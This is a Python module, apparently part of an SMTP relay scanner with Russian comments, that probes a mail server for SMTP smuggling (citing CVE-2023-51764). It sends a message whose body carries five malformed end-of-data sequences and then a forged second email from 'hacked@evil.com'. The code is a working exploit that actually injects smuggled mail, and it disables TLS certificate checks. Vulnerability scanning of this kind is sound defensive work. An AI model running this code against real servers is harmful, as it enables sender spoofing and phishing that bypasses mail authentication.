# smtp_relay_scanner/modules/checker/smuggler.py

import socket
import ssl
from typing import Dict, List, Optional, Tuple
from datetime import datetime

from smtp_relay_scanner.config import TIMEOUT_CONNECT, TIMEOUT_READ


def test_smtp_smuggling(
    ip: str,
    port: int,
    domain: str = "test.local",
    use_ssl: bool = False
) -> Dict[str, any]:
    """
    Проверяет SMTP сервер на уязвимость SMTP Smuggling.
    
    Тестирует различные варианты обхода end-of-data последовательности:
    - <LF>.<CR><LF> (CVE-2023-51764 Postfix)
    - <CR>.<CR><LF>
    - <LF>.<LF>
    - <CR><LF>.<CR>
    
    Returns:
        Dict с результатами тестов
    """
    result = {
        "ip": ip,
        "port": port,
        "vulnerable": False,
        "tests": [],
        "summary": ""
    }
    
    # === Варианты smuggling последовательностей ===
    smuggling_tests = [
        {
            "id": "lf_dot_crlf",
            "name": "<LF>.<CR><LF> (CVE-2023-51764-like)",
            "eod_sequence": b"\n.\r\n",
            "description": "LF только перед точкой, CRLF после"
        },
        {
            "id": "cr_dot_crlf",
            "name": "<CR>.<CR><LF>",
            "eod_sequence": b"\r.\r\n",
            "description": "CR перед точкой, CRLF после"
        },
        {
            "id": "lf_dot_lf",
            "name": "<LF>.<LF>",
            "eod_sequence": b"\n.\n",
            "description": "LF с обеих сторон"
        },
        {
            "id": "crlf_dot_cr",
            "name": "<CR><LF>.<CR>",
            "eod_sequence": b"\r\n.\r",
            "description": "CRLF перед точкой, только CR после"
        },
        {
            "id": "tab_dot_crlf",
            "name": "<TAB>.<CR><LF>",
            "eod_sequence": b"\t.\r\n",
            "description": "TAB перед точкой, CRLF после"
        }
    ]
    
    for test in smuggling_tests:
        test_result = _try_smuggle(ip, port, test, domain, use_ssl)
        result["tests"].append(test_result)
        if test_result.get("vulnerable"):
            result["vulnerable"] = True
    
    if result["vulnerable"]:
        vuln_tests = [t["name"] for t in result["tests"] if t.get("vulnerable")]
        result["summary"] = f"VULNERABLE to SMTP Smuggling via: {', '.join(vuln_tests)}"
    else:
        result["summary"] = "Not vulnerable to SMTP Smuggling"
    
    return result


def _try_smuggle(
    ip: str,
    port: int,
    test_config: Dict[str, any],
    domain: str,
    use_ssl: bool
) -> Dict[str, any]:
    """
    Пытается выполнить smuggling с конкретной последовательностью.
    
    Схема теста:
    1. EHLO
    2. MAIL FROM: <smuggle@test.com>
    3. RCPT TO: <test@test.com>
    4. DATA
    5. Отправляем письмо с встроенной EOD последовательностью
    6. После EOD пытаемся отправить второе письмо
    7. Если сервер принимает второе письмо (250) — SMTP smuggling работает
    """
    test_result = {
        "test_id": test_config["id"],
        "name": test_config["name"],
        "description": test_config["description"],
        "vulnerable": False,
        "response": ""
    }
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT_CONNECT)
        sock.connect((ip, port))
        
        if use_ssl or port == 465:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=ip)
        
        sock.settimeout(TIMEOUT_READ)
        
        def recv_all():
            data = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if data.count(b"\r\n") >= 3:
                        break
            except socket.timeout:
                pass
            return data.decode('utf-8', errors='ignore')
        
        # Баннер
        banner = recv_all()
        if not banner:
            test_result["response"] = "No banner"
            sock.close()
            return test_result
        
        # EHLO
        sock.sendall(f"EHLO {domain}\r\n".encode())
        ehlo = recv_all()
        
        # MAIL FROM
        sock.sendall(b"MAIL FROM:<smuggle@test.com>\r\n")
        mail_resp = recv_all()
        
        # RCPT TO
        sock.sendall(b"RCPT TO:<test@test.com>\r\n")
        rcpt_resp = recv_all()
        
        # DATA
        sock.sendall(b"DATA\r\n")
        data_resp = recv_all()
        
        if not data_resp.startswith("354"):
            test_result["response"] = f"DATA rejected: {data_resp.strip()[:50]}"
            sock.close()
            return test_result
        
        # Отправляем письмо с "фальшивой" EOD последовательностью
        # Письмо 1 (легитимное)
        msg1 = (
            f"From: smuggle@test.com\r\n"
            f"To: test@test.com\r\n"
            f"Subject: SMTP Smuggling Test\r\n"
            f"\r\n"
            f"This is a test message.\r\n"
        ).encode()
        sock.sendall(msg1)
        
        # Отправляем фальшивую EOD последовательность
        # Если сервер её пропустит — он подумает, что письмо закончилось
        sock.sendall(test_config["eod_sequence"])
        
        # Письмо 2 (smuggled) — отправляем без SMTP транзакции
        msg2 = (
            f"From: hacked@evil.com\r\n"
            f"To: victim@target.com\r\n"
            f"Subject: SMUGGLED!\r\n"
            f"\r\n"
            f"This email was smuggled through!\r\n"
        ).encode()
        sock.sendall(msg2)
        
        # Настоящая EOD (закрываем всё)
        sock.sendall(b"\r\n.\r\n")
        
        # Читаем ответ
        try:
            final_resp = sock.recv(4096).decode('utf-8', errors='ignore')
            test_result["response"] = final_resp.strip()[:200]
            
            # Если видим 250 (OK) после нашей smuggling последовательности — уязвим!
            if "250" in final_resp and "OK" in final_resp:
                test_result["vulnerable"] = True
        except:
            pass
        
        # QUIT
        try:
            sock.sendall(b"QUIT\r\n")
        except:
            pass
        sock.close()
        
    except Exception as e:
        test_result["response"] = str(e)
        try:
            sock.close()
        except:
            pass
    
    return test_result


def check_postfix_smuggling(ip: str, port: int, domain: str = "test.local") -> Dict[str, any]:
    """
    Специализированная проверка на CVE-2023-51764 (Postfix SMTP Smuggling).
    """
    return test_smtp_smuggling(ip, port, domain)